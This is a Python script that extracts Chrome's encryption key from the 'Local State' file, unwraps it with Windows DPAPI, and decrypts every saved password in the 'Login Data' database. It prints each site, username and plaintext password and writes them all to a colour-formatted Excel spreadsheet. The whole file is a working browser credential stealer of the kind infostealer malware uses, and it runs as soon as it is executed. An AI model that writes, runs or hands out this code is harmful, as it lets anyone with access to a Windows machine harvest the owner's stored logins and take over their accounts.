import os
import sys
from shutil import copy2
import sqlite3
from base64 import b64decode
from json import loads
import win32crypt
from Crypto.Cipher import AES
import pandas as pd

def chrome_creds_extractor():
    # Extract and decode the AES key which is used to
    # encrypt the passwords.
    # It is stored in '%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Local State'
    # as JSON format

    try:
        key_path = os.path.join(os.environ['USERPROFILE'],'AppData','Local','Google','Chrome','User Data','Local State')
        with open(key_path,'r',encoding='utf-8') as f:
            key = loads(f.read())
            key = b64decode(key['os_crypt']['encrypted_key'])
            # Remove DPAPI string
            key = key[5:]
            key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
            
    except Exception as e:
        print(e)
        sys.exit(1)

    # Copy sqlite chrome database since it cannot be accessed
    # while chrome is running. It's location is
    # '%USERPROFILE%\AppData\Local\Google\Chrome\User Data\default\Login Data'
    
    try:
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","Google", "Chrome", "User Data", "default", "Login Data")
        copy2(db_path,'chrome_db_temp.db')

        conn = sqlite3.connect('chrome_db_temp.db')
        c = conn.cursor()
        # Query desired info from database
        c.execute('select origin_url, action_url, username_value, password_value from logins')

        data = []

        for row in c.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = row[3]

            # Get the initialization vector
            iv = password[3:15]
            password = password[15:]
            # Generate cipher
            cipher = AES.new(key, AES.MODE_GCM, iv)
            # Decrypt password
            password = cipher.decrypt(password)[:-16].decode()

            print(f"Origin_url: {origin_url}\naction_url: {action_url}\nusername: {username}\npassword: {password}\n")

            data.append([origin_url, action_url, username, password])

        # Save result into Excel file
        df = pd.DataFrame(data, columns=["Origin URL", "Action URL", "Username", "Password"])
        excel_path = 'chrome_creds.xlsx'
        df.to_excel(excel_path, index=False)

        # Apply formatting
        from openpyxl import load_workbook
        from openpyxl.styles import Font, Alignment, PatternFill
        from openpyxl.worksheet.dimensions import ColumnDimension

        wb = load_workbook(excel_path)
        ws = wb.active

        # Define colors for each column
        colors = ["FFCCFF", "CCFFCC", "CCCCFF", "FFFFCC"]
        
        # Enable text wrapping and set column width, colorize columns
        for i, column in enumerate(ws.columns):
            max_length = 0
            column_letter = column[0].column_letter
            for cell in column:
                cell.alignment = Alignment(wrap_text=True)
                cell.fill = PatternFill(start_color=colors[i % len(colors)], end_color=colors[i % len(colors)], fill_type="solid")
                if len(str(cell.value)) > max_length:
                    max_length = len(str(cell.value))
            ws.column_dimensions[column_letter].width = min(max_length + 2, 40)

        # Apply bold font and background color to header
        header_fill = PatternFill(start_color="FFFF00", end_color="FFFF00", fill_type="solid")
        for cell in ws["1:1"]:
            cell.font = Font(bold=True)
            cell.fill = header_fill

        # Freeze the top row
        ws.freeze_panes = ws['A2']

        wb.save(excel_path)

        c.close()
        conn.close()
        os.remove('chrome_db_temp.db')

    except Exception as e:
        print(e)
        sys.exit(1)

chrome_creds_extractor()
